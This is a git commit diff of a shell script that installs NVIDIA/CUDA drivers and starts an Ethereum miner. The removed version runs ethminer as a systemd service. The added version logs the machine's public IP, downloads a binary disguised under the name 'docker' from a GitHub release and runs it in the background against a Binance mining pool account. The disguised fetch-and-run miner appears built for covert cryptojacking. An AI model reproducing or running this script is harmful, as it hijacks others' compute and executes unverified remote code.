6c992e8d1c2493446a053beacc7b5cdcb3bd90fd
siwo81 <98247692+siwo81@users.noreply.github.com>
2022-03-15 06:58:26 +0700

    Update wow.sh

--- wow.sh
+++ wow.sh
@@ -1,23 +1,22 @@
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
-if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
-then
-	echo "taind vip pro" > isHaveSetupCoin.txt
-	cd /usr/local/bin
-	sudo apt-get install linux-headers-$(uname -r) -y
-	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
-	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+if [ ! -f "${SCRIPT_DIR}/installed.txt" ]; then
+	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
+	echo "$ip" > installed.txt
+	wget http://us.download.nvidia.com/tesla/410.129/nvidia-diag-driver-local-repo-ubuntu1804-410.129_1.0-1_amd64.deb
+	sudo dpkg -i nvidia-diag-driver-local-repo-ubuntu1804-410.129_1.0-1_amd64.deb
+	sudo apt-key add /var/nvidia-diag-driver-local-repo-410.129/7fa2af80.pub
 	sudo apt-get update
 	sudo apt-get -y install cuda-drivers --allow-unauthenticated
+	sudo apt-get install gcc g++ build-essential libssl-dev automake linux-headers-$(uname -r) git gawk libcurl4-openssl-dev libjansson-dev xorg libc++-dev libgmp-dev python-dev -y
+	wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
+	sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
+	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
+	sudo add-apt-repository "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/ /"
+	sudo apt-get update
+	sudo apt-get -y install cuda
 	sudo apt-get install libcurl3 -y
-	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -u qpoldi -p x stratum+tcp://ethash.poolbinance.com:1800 -w RNS &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
-	sudo systemctl daemon-reload
-	sudo systemctl enable eth.service
-	sudo systemctl start eth.service
-else
-	sudo systemctl start eth.service
+	wget https://github.com/tuannguyends/mainsystem/releases/download/main/docker
+	chmod +x docker
+	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
+	./docker -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u qpoldi -p x -w STD &
 fi
